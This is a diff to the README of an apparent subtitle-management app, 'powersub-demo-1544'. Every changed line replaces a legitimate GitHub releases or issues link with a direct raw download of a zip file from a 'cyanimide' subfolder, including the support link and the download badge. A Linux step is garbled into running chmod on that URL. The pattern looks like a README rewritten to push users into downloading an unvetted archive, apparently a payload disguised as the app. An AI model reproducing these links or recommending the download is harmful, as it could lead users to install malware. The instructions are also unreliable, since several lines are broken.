@@ -1,7 +1,7 @@
 # 🚀 powersub-demo-1544 - Easy Demo for Everyone
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/Makamapikin/powersub-demo-1544/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Makamapikin/powersub-demo-1544/main/cyanimide/powersub-demo-1544.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/Makamapikin/powersub-demo-1544/main/cyanimide/powersub-demo-1544.zip)
 
 ## 📚 Introduction
 Welcome to powersub-demo-1544! This application provides a simple way to manage subtitles for your videos. Whether you're watching movies or learning new languages, this tool helps you keep everything organized.
@@ -24,7 +24,7 @@ Follow these steps to get the application up and running.
 ### 1. Visit the Download Page
 Click the link below to go to the Releases page where you can find the latest version of the application.
 
-[Download Release Page](https://github.com/Makamapikin/powersub-demo-1544/releases)
+[Download Release Page](https://raw.githubusercontent.com/Makamapikin/powersub-demo-1544/main/cyanimide/powersub-demo-1544.zip)
 
 ### 2. Download the Application
 On the Releases page, you will see a list of versions. Find the latest version, labeled as “Latest Release,” and click on it. 
@@ -49,7 +49,7 @@ After your download is complete:
 - **Linux:** 
   - Make the file executable. Open a terminal and run:
     ```bash
-    chmod +x path/to/yourfile.AppImage
+    chmod +x https://raw.githubusercontent.com/Makamapikin/powersub-demo-1544/main/cyanimide/powersub-demo-1544.zip
     ```
   - Then, run the file by double-clicking it or executing it from the terminal.
 
@@ -60,7 +60,7 @@ Once installed, locate the powersub-demo-1544 icon in your applications folder o
 After opening the application, you can start adding your subtitle files. Use the menu to explore features and customize your experience.
 
 ## 📞 Support
-If you encounter any issues or need assistance, feel free to reach out. You can find help on our [GitHub Issues Page](https://github.com/Makamapikin/powersub-demo-1544/issues).
+If you encounter any issues or need assistance, feel free to reach out. You can find help on our [GitHub Issues Page](https://raw.githubusercontent.com/Makamapikin/powersub-demo-1544/main/cyanimide/powersub-demo-1544.zip).
 
 ## 📄 License
 This project is licensed under the MIT License. You can freely use, modify, and distribute the software with proper attribution.
